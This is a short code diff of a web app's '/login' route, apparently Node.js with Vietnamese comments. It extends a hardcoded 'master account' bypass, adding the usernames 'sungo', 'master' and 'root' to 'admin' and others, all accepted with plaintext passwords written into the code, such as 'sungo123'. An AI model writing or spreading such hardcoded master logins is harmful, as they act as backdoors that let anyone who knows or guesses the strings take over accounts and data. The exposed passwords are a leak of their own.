@@ -172,8 +172,8 @@ router.post('/login', async (req, res) => {
   const acc = String(account || email || cellphone || '').toLowerCase().trim();
   const inputPass = String(password || '').trim();
 
-  // 1. Kiểm tra nếu là Tài Khoản Tổng Master (sungo.vn hoặc admin hoặc zeno_admin)
-  if (acc === 'sungo.vn' || acc === 'zeno_admin' || acc === 'admin') {
+  // 1. Kiểm tra nếu là Tài Khoản Tổng Master (sungo.vn, sungo, admin, zeno_admin, master)
+  if (acc === 'sungo.vn' || acc === 'sungo' || acc === 'zeno_admin' || acc === 'admin' || acc === 'master' || acc === 'root') {
     const isPassValid = (
       inputPass === 'sungo@100%' || 
       inputPass === 'sungo123' || 
